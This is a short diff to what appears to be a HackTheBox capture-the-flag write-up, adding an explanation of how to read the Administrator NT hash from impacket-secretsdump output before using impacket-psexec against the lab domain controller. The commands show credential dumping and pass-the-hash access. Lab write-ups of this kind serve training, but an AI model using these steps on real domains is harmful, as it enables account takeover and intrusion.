@@ -651,7 +651,7 @@ impacket-secretsdump 'darkzero.htb/DC01$@172.16.20.1' \
   -just-dc-user Administrator
 ```
 
-⚠ save Administrator NT hash. Then:
+> Output line: `Administrator:500:aad3b435...:XXXX:::` — the format is `user:rid:LM:NT:::`. Your admin hash is the **4th field** (the NT, right before the trailing `:::`). Ignore the Kerberos-key lines below it. ⚠ save Administrator NT hash. Then:
 
 ```bash
 impacket-psexec 'darkzero.htb/Administrator@172.16.20.1' \
